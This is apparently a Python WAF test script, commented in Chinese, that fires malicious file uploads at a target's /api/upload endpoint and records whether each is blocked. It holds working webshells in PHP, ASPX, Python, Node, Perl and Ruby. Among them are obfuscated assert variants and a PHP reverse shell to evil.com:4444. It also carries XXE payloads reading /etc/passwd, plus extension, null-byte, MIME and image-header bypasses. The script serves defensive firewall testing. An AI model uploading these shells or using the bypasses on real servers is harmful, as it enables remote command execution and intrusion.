#!/usr/bin/env python3
"""
文件上传攻击测试脚本

覆盖注入点:
  - POST multipart/form-data 上传
  - Content-Type 绕过
  - 文件名绕过
  - 文件内容绕过

Payload 来源: PHP WebShell、JSP、ASPX、Python、Node.js 等危险文件，
              双扩展名、空字节、MIME 伪造、图片马等。
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from test_base import WAFTestBase, parse_args, Colors


class UploadTester(WAFTestBase):
    ATTACK_NAME = "Malicious File Upload"
    ATTACK_DESC = "恶意文件上传测试 — WebShell、危险扩展名、MIME 伪造、图片马"

    # 危险文件内容
    WEBSHELL_PHP = """<?php @eval($_POST['cmd']); ?>"""
    WEBSHELL_PHP2 = """<?php system($_GET['cmd']); ?>"""
    WEBSHELL_PHP3 = """<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>"""
    WEBSHELL_PHP4 = """<?php $sock=fsockopen("evil.com",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>"""
    WEBSHELL_PHP5 = """<?php @assert($_REQUEST['cmd']); ?>"""
    WEBSHELL_PHP6 = """<?php $a='as'.'se'.'rt';$a($_POST['x']); ?>"""
    WEBSHELL_PHP7 = """<?php $a=str_replace('x','','axsxxexrxxt');$a($_POST['x']); ?>"""
    WEBSHELL_PHP8 = """<?php @preg_replace('/.*/e',$_POST['x'],''); ?>"""

    WEBSHELL_JSP = """<%@ page import="java.io.*" %>
<%                                                                                                                                                                                                                                                             %>"""

    WEBSHELL_ASPX = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>"""

    WEBSHELL_PYTHON = """import os, sys
from http.server import BaseHTTPRequestHandler, HTTPServer
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        cmd = self.path.split('cmd=')[-1]
        self.send_response(200)
        self.end_headers()
        self.wfile.write(os.popen(cmd).read().encode())
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()"""

    WEBSHELL_NODE = """require('http').createServer((req,res)=>{
    const cmd=require('url').parse(req.url,true).query.cmd;
    require('child_process').exec(cmd,(e,o)=>res.end(o));
}).listen(8080);"""

    WEBSHELL_PERL = """#!/usr/bin/perl
print "Content-type: text/html\n\n";
$cmd = $ENV{'QUERY_STRING'};
$cmd =~ s/cmd=//;
print `$cmd`;"""

    WEBSHELL_RUBY = """#!/usr/bin/env ruby
require 'webrick'
server = WEBrick::HTTPServer.new(:Port => 8080)
server.mount_proc '/' do |req, res|
  res.body = `#{req.query['cmd']}`
end
server.start"""

    def _upload(self, name: str, filename: str, content: bytes,
                content_type: str = "application/octet-stream",
                extra_fields: dict = None):
        """构造 multipart 上传请求"""
        files = {"file": (filename, content, content_type)}
        data = extra_fields or {}
        return self.send_and_record(
            name, f"filename={filename}", "POST", "/api/upload",
            expected_block=True, injection_point="multipart-upload",
            files=files, data=data
        )

    def run(self):
        print(f"  {Colors.c('正在执行文件上传测试...', Colors.INFO)}\n")

        print(f"  {Colors.c('[测试] 危险扩展名文件', Colors.CYAN)}")
        # PHP
        self._upload("php-webshell", "shell.php", self.WEBSHELL_PHP.encode(), "application/x-php")
        self._upload("php-webshell-2", "shell.php", self.WEBSHELL_PHP2.encode(), "text/plain")
        self._upload("php-webshell-3", "shell.phtml", self.WEBSHELL_PHP3.encode(), "text/html")
        self._upload("php-webshell-4", "shell.php3", self.WEBSHELL_PHP4.encode(), "application/octet-stream")
        self._upload("php-webshell-5", "shell.php4", self.WEBSHELL_PHP5.encode(), "text/plain")
        self._upload("php-webshell-6", "shell.php5", self.WEBSHELL_PHP6.encode(), "text/plain")
        self._upload("php-webshell-7", "shell.pht", self.WEBSHELL_PHP7.encode(), "text/plain")
        self._upload("php-webshell-8", "shell.phar", self.WEBSHELL_PHP8.encode(), "application/octet-stream")

        # JSP / ASPX
        self._upload("jsp-webshell", "shell.jsp", self.WEBSHELL_JSP.encode(), "text/html")
        self._upload("jspx-webshell", "shell.jspx", self.WEBSHELL_JSP.encode(), "application/xml")
        self._upload("aspx-webshell", "shell.aspx", self.WEBSHELL_ASPX.encode(), "text/html")
        self._upload("ashx-webshell", "shell.ashx", self.WEBSHELL_ASPX.encode(), "text/plain")
        self._upload("asmx-webshell", "shell.asmx", self.WEBSHELL_ASPX.encode(), "text/xml")
        self._upload("ascx-webshell", "shell.ascx", self.WEBSHELL_ASPX.encode(), "text/plain")

        # Python / Node / Perl / Ruby
        self._upload("py-webshell", "shell.py", self.WEBSHELL_PYTHON.encode(), "text/x-python")
        self._upload("pyw-webshell", "shell.pyw", self.WEBSHELL_PYTHON.encode(), "text/plain")
        self._upload("node-webshell", "shell.js", self.WEBSHELL_NODE.encode(), "application/javascript")
        self._upload("node-jse", "shell.jse", self.WEBSHELL_NODE.encode(), "text/plain")
        self._upload("perl-webshell", "shell.pl", self.WEBSHELL_PERL.encode(), "text/x-perl")
        self._upload("perl-cgi", "shell.cgi", self.WEBSHELL_PERL.encode(), "text/plain")
        self._upload("ruby-webshell", "shell.rb", self.WEBSHELL_RUBY.encode(), "text/x-ruby")
        self._upload("ruby-rhtml", "shell.rhtml", self.WEBSHELL_RUBY.encode(), "text/html")

        # 其他危险扩展名
        self._upload("sh-webshell", "shell.sh", b"#!/bin/sh\necho $(whoami)", "text/x-shellscript")
        self._upload("bat-webshell", "shell.bat", b"@echo off\nwhoami", "text/plain")
        self._upload("cmd-webshell", "shell.cmd", b"@echo off\nwhoami", "text/plain")
        self._upload("exe-upload", "shell.exe", b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00", "application/x-msdownload")
        self._upload("dll-upload", "shell.dll", b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00", "application/x-msdownload")
        self._upload("war-upload", "shell.war", b"PK\x03\x04", "application/java-archive")
        self._upload("jar-upload", "shell.jar", b"PK\x03\x04", "application/java-archive")
        self._upload("ear-upload", "shell.ear", b"PK\x03\x04", "application/java-archive")
        self._upload("swf-upload", "shell.swf", b"CWS", "application/x-shockwave-flash")
        self._upload("hta-upload", "shell.hta", b"<html>\n<script>alert(1)</script>\n</html>", "application/hta")
        self._upload("shtml-upload", "shell.shtml", b"<!--#exec cmd=\"whoami\" -->", "text/html")
        self._upload("svg-upload", "shell.svg", b"<?xml version=\"1.0\"?>\n<svg><script>alert(1)</script></svg>", "image/svg+xml")
        self._upload("xml-upload", "shell.xml", b"<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<foo>\u0026xxe;</foo>", "text/xml")

        print(f"  {Colors.c('[测试] 扩展名绕过', Colors.CYAN)}")
        # 双扩展名
        self._upload("double-ext-1", "shell.php.jpg", self.WEBSHELL_PHP.encode(), "image/jpeg")
        self._upload("double-ext-2", "shell.jpg.php", self.WEBSHELL_PHP.encode(), "application/x-php")
        self._upload("double-ext-3", "shell.php.png", self.WEBSHELL_PHP.encode(), "image/png")
        self._upload("double-ext-4", "shell.png.php", self.WEBSHELL_PHP.encode(), "application/x-php")
        self._upload("double-ext-5", "shell.php.gif", self.WEBSHELL_PHP.encode(), "image/gif")
        self._upload("double-ext-6", "shell.gif.php", self.WEBSHELL_PHP.encode(), "application/x-php")
        self._upload("double-ext-7", "shell.php.txt", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("double-ext-8", "shell.txt.php", self.WEBSHELL_PHP.encode(), "application/x-php")

        # 大小写
        self._upload("case-1", "shell.PHP", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("case-2", "shell.Php", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("case-3", "shell.pHp", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("case-4", "shell.JSP", self.WEBSHELL_JSP.encode(), "text/plain")
        self._upload("case-5", "shell.Aspx", self.WEBSHELL_ASPX.encode(), "text/plain")
        self._upload("case-6", "shell.JS", self.WEBSHELL_NODE.encode(), "text/plain")
        self._upload("case-7", "shell.PY", self.WEBSHELL_PYTHON.encode(), "text/plain")

        # 空字节截断
        self._upload("null-trunc-1", "shell.php\x00.jpg", self.WEBSHELL_PHP.encode(), "image/jpeg")
        self._upload("null-trunc-2", "shell.php%00.jpg", self.WEBSHELL_PHP.encode(), "image/jpeg")

        # 特殊字符
        self._upload("special-1", "shell.php.", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("special-2", "shell.php...", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("special-3", "shell.php\x20", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("special-4", "shell.php:", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("special-5", "shell.php::$DATA", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("special-6", "shell.php::$INDEX_ALLOCATION", self.WEBSHELL_PHP.encode(), "text/plain")

        print(f"  {Colors.c('[测试] MIME 类型伪造', Colors.CYAN)}")
        # 用危险扩展名但伪造 MIME
        self._upload("mime-fake-1", "shell.php", self.WEBSHELL_PHP.encode(), "image/jpeg")
        self._upload("mime-fake-2", "shell.php", self.WEBSHELL_PHP.encode(), "image/png")
        self._upload("mime-fake-3", "shell.php", self.WEBSHELL_PHP.encode(), "image/gif")
        self._upload("mime-fake-4", "shell.php", self.WEBSHELL_PHP.encode(), "text/plain")
        self._upload("mime-fake-5", "shell.jsp", self.WEBSHELL_JSP.encode(), "image/jpeg")
        self._upload("mime-fake-6", "shell.aspx", self.WEBSHELL_ASPX.encode(), "image/png")
        self._upload("mime-fake-7", "shell.py", self.WEBSHELL_PYTHON.encode(), "image/gif")
        self._upload("mime-fake-8", "shell.js", self.WEBSHELL_NODE.encode(), "text/plain")

        print(f"  {Colors.c('[测试] 图片马', Colors.CYAN)}")
        # 在图片文件头后插入 webshell
        gif_header = b"GIF89a\x01\x00\x01\x00\x00\x00\x00\x3b"
        png_header = b"\x89PNG\r\n\x1a\n"
        jpg_header = b"\xff\xd8\xff\xe0\x00\x10JFIF"

        self._upload("img-horse-gif", "shell.gif", gif_header + self.WEBSHELL_PHP.encode(), "image/gif")
        self._upload("img-horse-png", "shell.png", png_header + self.WEBSHELL_PHP.encode(), "image/png")
        self._upload("img-horse-jpg", "shell.jpg", jpg_header + self.WEBSHELL_PHP.encode(), "image/jpeg")
        self._upload("img-horse-gif-php", "shell.gif.php", gif_header + self.WEBSHELL_PHP.encode(), "image/gif")
        self._upload("img-horse-png-php", "shell.png.php", png_header + self.WEBSHELL_PHP.encode(), "image/png")
        self._upload("img-horse-jpg-php", "shell.jpg.php", jpg_header + self.WEBSHELL_PHP.encode(), "image/jpeg")

        print(f"  {Colors.c('[测试] 无扩展名危险内容', Colors.CYAN)}")
        self._upload("no-ext-php", "shell", self.WEBSHELL_PHP.encode(), "application/x-php")
        self._upload("no-ext-js", "shell", self.WEBSHELL_NODE.encode(), "application/javascript")
        self._upload("no-ext-py", "shell", self.WEBSHELL_PYTHON.encode(), "text/x-python")
        self._upload("no-ext-plain", "shell", b"<?php system('whoami'); ?>", "text/plain")
        self._upload("no-ext-html", "shell", b"<script>alert(1)</script>", "text/html")
        self._upload("no-ext-xml", "shell", b"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>\u0026xxe;</foo>", "text/xml")


if __name__ == "__main__":
    args = parse_args("文件上传攻击测试")
    tester = UploadTester(
        target=args.target, domain=args.domain,
        verbose=args.verbose, timeout=args.timeout, delay=args.delay
    )
    tester.execute()
